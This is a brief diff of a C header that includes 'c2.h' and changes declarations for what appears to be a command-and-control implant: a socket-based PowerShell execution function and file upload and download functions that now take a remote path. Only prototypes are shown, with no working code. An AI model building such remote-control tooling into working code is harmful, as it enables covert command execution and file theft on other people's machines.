@@ -3,8 +3,8 @@
 
 #include "c2.h"
 
-void psh_receive(sock_t sock);
-void upload_file_to_server(sock_t sock);
-void download_file_from_server(sock_t sock);
+int psh_exec(sock_t sock, const char *cmd);
+void upload_file_to_server(sock_t sock, char* remote_path);
+void download_file_from_server(sock_t sock, char *remote_path);
 
 #endif /* UTILS_H */
